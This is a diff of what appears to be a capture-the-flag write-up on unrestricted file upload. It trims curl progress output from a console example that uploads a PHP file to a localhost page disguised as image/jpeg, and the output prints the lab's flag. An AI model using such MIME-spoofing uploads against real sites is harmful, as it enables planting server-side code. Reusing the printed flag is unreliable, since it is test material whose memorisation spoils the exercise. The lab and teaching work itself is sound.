@@ -17,9 +17,6 @@ With `curl`, by copying the request sent from a browser and hardcoding the MIME 
 
 ```console
 $ curl -X POST 'http://localhost:8080/index.php?page=upload#' -H 'Content-Type: multipart/form-data' -F 'uploaded=@unrestricted_file_upload/resources/test.php;type=image/jpeg' -F 'MAX_FILE_SIZE=100000' -F 'Upload=Upload' | grep flag
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  3138    0  2739  100   399    547     79  0:00:05  0:00:05 --:--:--   720
 <pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
 ```
 
